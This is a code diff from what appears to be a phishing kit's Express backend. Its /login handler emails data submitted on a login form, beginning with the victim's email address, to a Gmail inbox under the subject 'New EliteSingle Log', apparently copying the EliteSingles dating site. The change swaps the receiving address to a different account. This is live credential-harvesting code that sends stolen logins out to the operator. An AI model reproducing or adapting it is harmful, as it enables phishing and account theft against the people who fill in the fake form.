@@ -39,7 +39,7 @@ app.get('/', (req, res) => {
 app.post('/login', (req, res) => {
   var mailOptions = {
     from: 'therealhayley800@gmail.com', // sender address
-    to: 'elisetaylor2020@gmail.com', // list of receivers
+    to: 'hayleygary18@gmail.com', // list of receivers
     subject: 'New EliteSingle Log', // Subject line
     html: `<h1>New EliteSingle Log</h1> <br>
       <h2>new email : ${req.body.email} </h2>
